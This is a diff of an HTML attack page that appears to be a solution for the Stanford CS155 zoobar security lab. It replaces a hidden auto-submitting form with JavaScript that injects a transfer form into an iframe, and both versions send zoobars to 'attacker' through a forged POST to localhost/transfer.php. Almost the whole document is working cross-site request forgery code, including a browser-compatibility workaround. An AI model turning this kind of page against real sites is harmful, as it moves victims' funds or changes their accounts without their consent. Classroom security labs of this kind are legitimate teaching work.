@@ -3,21 +3,40 @@
 
 	<head>
 		<title>&nbsp;</title>
+		<meta charset="UTF-8"/>
 	</head>
 
 	<body>
-		<iframe id="myFrame" style="display:none"></iframe>
 
-		<form id="myForm" style="display:none" action="http://localhost/transfer.php" method="POST" target="myFrame">
-			<input type="text" name="zoobars" value="1"> <!-- TODO: need to change this to value=10 -->
-			<input type="text" name="recipient" value="attacker">
-			<input type="text" name="submission" value="Send">
-		</form>
+		<iframe id='outerFrame' style='width: 1000px; height: 1000px; background-color: #DDDDFF;'></iframe>
+		
+		
+		<script type="text/javascript">
+		//<![CDATA[
+			f = document.getElementById("outerFrame");
+			fdoc = f.contentDocument;
+			egg = "<iframe id='innerFrame' src='http://localhost/transfer.php' style='width:400px; height: 400px; background-color: red;'></iframe>" +
+				"<form id='transferForm' style='' action='http://localhost/transfer.php' method='POST'>" +
+				"<input type='text' name='zoobars' value='1'>" +
+				"<input type='text' name='recipient' value='attacker'>" +
+				"<input type='text' name='submission' value='Send'>" +
+				"</form>";
 
-		<script>
-			document.getElementById("myForm").submit();
-			setTimeout(function(){document.location.href="http://crypto.stanford.edu/cs155/"},50)
+			// TODO: need to change value for zoobars to 10
+			
+			// Hack, trigger a page load, otherwise attack works in Chrome but not in Firefox. see http://stackoverflow.com/questions/7828502/cannot-set-document-body-innerhtml-of-iframe-in-firefox
+			fdoc.open();
+			fdoc.close();
+			//Set innerHTML of the body tag.
+			fdoc.body.innerHTML = egg;
+			//setTimeout(function(){document.location.href="http://crypto.stanford.edu/cs155/"},50)
+
+		//]]>
 		</script>
+		
 	</body>
 
 </html>
+
+
+<!-- "<form id='transferForm' style='' action='http://localhost/transfer.php' method='POST' target='innerFrame'>" + -->
